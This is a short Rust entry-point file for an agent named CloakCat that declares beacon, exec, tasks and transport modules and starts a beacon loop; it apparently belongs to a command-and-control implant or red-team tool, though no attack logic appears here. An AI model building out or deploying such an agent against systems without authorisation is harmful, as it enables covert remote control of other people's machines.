//! CloakCat agent entry point.

mod beacon;
mod config;
mod exec;
mod host;
mod tasks;
mod transport;

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    beacon::run().await
}
